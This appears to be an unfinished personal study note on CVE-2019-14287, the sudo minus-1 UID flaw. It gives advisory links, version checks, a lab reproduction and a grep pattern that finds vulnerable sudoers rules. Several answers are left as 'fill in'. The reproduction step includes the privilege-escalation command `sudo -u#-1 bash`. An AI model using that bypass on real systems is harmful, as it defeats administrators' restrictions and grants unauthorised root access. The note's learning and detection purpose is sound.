# CVE

## MAIN

CVE - Common Vulnerabilities and Exposures

### CVE-2019-14287 sudo minus 1 uid

#### src

* [sudo.ws](https://www.sudo.ws/alerts/minus_1_uid.html)
* [CVE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)
* [launchpad.net/ubuntu](https://launchpad.net/ubuntu) -&gt; find package

#### Details

check `sudo` version `$ sudo -V`

`$ apt show sudo` -&gt; `http://www.sudo.ws/`

```bash
$ sudo adduser alexis
$ sudo visudo
# PAM file
alexis ALL=(ALL, !root) ALL

(alexis) $ sudo -u#-1 bash
```

How to downgrade a package?

{% hint style="danger" %}
fill in
{% endhint %}

How to upgrade only sudo pkg?

{% hint style="danger" %}
fill in
{% endhint %}

What is `$ sudo apt dist-upgrade` ?

{% hint style="danger" %}
fill in
{% endhint %}

Is there a way I can see all the versions that are in the archives that I have configured in `sources.list`. I can see the last version of each archive with `apt-get policy`, but how can I see them all?

```bash
$ apt list -a <pkg name>
```

{% hint style="info" %}
check what is `madison` ?
{% endhint %}

Where you can see the logs of `sudo` activity?

```bash
# Ubuntu
/var/log/auth.log 
```

Checking if your environment is affected:

```bash
$ cat /etc/sudoers | grep "(\s*ALL\s*,\s*\!root\s*)"
```

`\s` stands for whitespace character, matches a space, a tab, a line break etc.

\`\`



